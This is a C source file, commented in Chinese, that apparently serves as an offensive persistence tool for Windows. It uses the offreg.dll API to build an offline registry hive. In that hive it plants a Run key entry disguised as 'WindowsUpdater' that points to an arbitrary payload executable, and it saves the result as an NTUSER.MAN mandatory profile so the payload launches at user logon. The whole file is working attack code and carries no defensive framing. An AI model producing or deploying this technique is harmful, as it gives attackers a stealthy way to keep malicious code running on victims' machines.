#include <windows.h>
#include <stdio.h>

// 1. 手动声明 Offreg 相关的类型和函数指针
typedef PVOID ORHKEY;
typedef LONG (WINAPI* pORCreateHive)(ORHKEY*);
typedef LONG (WINAPI* pORCreateKey)(ORHKEY, LPCWSTR, LPCWSTR, DWORD, REGSAM, PVOID, ORHKEY*, LPDWORD);
typedef LONG (WINAPI* pORSetValue)(ORHKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
typedef LONG (WINAPI* pORSaveHive)(ORHKEY, LPCWSTR, DWORD, DWORD);
typedef LONG (WINAPI* pORCloseHive)(ORHKEY);
typedef LONG (WINAPI* pORCloseKey)(ORHKEY);

// 定义结构体保存函数地址
typedef struct {
    pORCreateHive  CreateHive;
    pORCreateKey   CreateKey;
    pORSetValue    SetValue;
    pORSaveHive    SaveHive;
    pORCloseHive   CloseHive;
    pORCloseKey    CloseKey;
    HMODULE hMod;
} OffregApi;

// 2. 动态加载 offreg.dll 并获取函数地址
BOOL InitOffreg(OffregApi* api) {
    // 优先加载当前目录下的 offreg.dll，如果没有，再加载系统 System32 下的
    api->hMod = LoadLibraryW(L"offreg.dll");
    if (!api->hMod) {
        api->hMod = LoadLibraryW(L"C:\\Windows\\System32\\offreg.dll");
    }
    if (!api->hMod) {
        wprintf(L"[-] Failed to load offreg.dll. Error: %lu\n", GetLastError());
        return FALSE;
    }

    api->CreateHive = (pORCreateHive)GetProcAddress(api->hMod, "ORCreateHive");
    api->CreateKey  = (pORCreateKey)GetProcAddress(api->hMod, "ORCreateKey");
    api->SetValue   = (pORSetValue)GetProcAddress(api->hMod, "ORSetValue");
    api->SaveHive   = (pORSaveHive)GetProcAddress(api->hMod, "ORSaveHive");
    api->CloseHive  = (pORCloseHive)GetProcAddress(api->hMod, "ORCloseHive");
    api->CloseKey   = (pORCloseKey)GetProcAddress(api->hMod, "ORCloseKey");

    if (!api->CreateHive || !api->CreateKey || !api->SetValue || !api->SaveHive || !api->CloseHive || !api->CloseKey) {
        wprintf(L"[-] Failed to get required Offreg exports.\n");
        return FALSE;
    }
    return TRUE;
}

// 3. 获取真实的系统版本，避免 Hive 版本不兼容导致系统崩溃
void GetRealOsVersion(DWORD* pMajor, DWORD* pMinor) {
    typedef LONG (WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    RTL_OSVERSIONINFOW osvi = { 0 };
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll) {
        RtlGetVersionPtr pRtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
        if (pRtlGetVersion && pRtlGetVersion(&osvi) == 0) {
            *pMajor = osvi.dwMajorVersion;
            *pMinor = osvi.dwMinorVersion;
            return;
        }
    }
    *pMajor = 10; *pMinor = 0; // 默认回退到 Win10
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc != 3) {
        wprintf(L"Usage: %s <payload_path> <output_ntuser_man>\n", argv[0]);
        wprintf(L"Example: %s C:\\Users\\vboxuser\\Desktop\\1.exe C:\\Users\\vboxuser\\NTUSER.MAN\n", argv[0]);
        return 1;
    }

    LPCWSTR payloadPath = argv[1];
    LPCWSTR outputPath  = argv[2];

    OffregApi api = { 0 };
    if (!InitOffreg(&api)) {
        return 1;
    }

    DWORD osMajor, osMinor;
    GetRealOsVersion(&osMajor, &osMinor);
    wprintf(L"[*] Detected OS version: %lu.%lu\n", osMajor, osMinor);

    ORHKEY hHive = NULL;
    LONG status;

    // 4. 在内存中创建离线 Hive
    status = api.CreateHive(&hHive);
    if (status != ERROR_SUCCESS) {
        wprintf(L"[-] ORCreateHive failed: %lu\n", status);
        return 1;
    }

    LPCWSTR runKeyPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    LPCWSTR valueName  = L"WindowsUpdater";

    ORHKEY hKey = NULL;
    DWORD dwDisposition;
    
    // 5. 构造完整的路径
    status = api.CreateKey(hHive, runKeyPath, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_CREATE_SUB_KEY, NULL, &hKey, &dwDisposition);
    if (status != ERROR_SUCCESS) {
        wprintf(L"[-] ORCreateKey failed: %lu\n", status);
        api.CloseHive(hHive);
        return 1;
    }

    // 6. 写入启动项
    status = api.SetValue(hKey, valueName, 0, REG_SZ, (const BYTE*)payloadPath, (DWORD)((wcslen(payloadPath) + 1) * sizeof(WCHAR)));
    if (status != ERROR_SUCCESS) {
        wprintf(L"[-] ORSetValue failed: %lu\n", status);
        api.CloseKey(hKey);
        api.CloseHive(hHive);
        return 1;
    }

    api.CloseKey(hKey);

    // 7. 保存为 NTUSER.MAN 文件
    status = api.SaveHive(hHive, outputPath, osMajor, osMinor);
    if (status != ERROR_SUCCESS) {
        wprintf(L"[-] ORSaveHive failed: %lu\n", status);
        api.CloseHive(hHive);
        return 1;
    }

    api.CloseHive(hHive);

    wprintf(L"[+] Successfully generated VALID NTUSER.MAN at: %s\n", outputPath);
    wprintf(L"[+] Payload: %s\n", payloadPath);
    wprintf(L"[!] Please LOG OFF and LOG ON to test.\n");

    return 0;
}
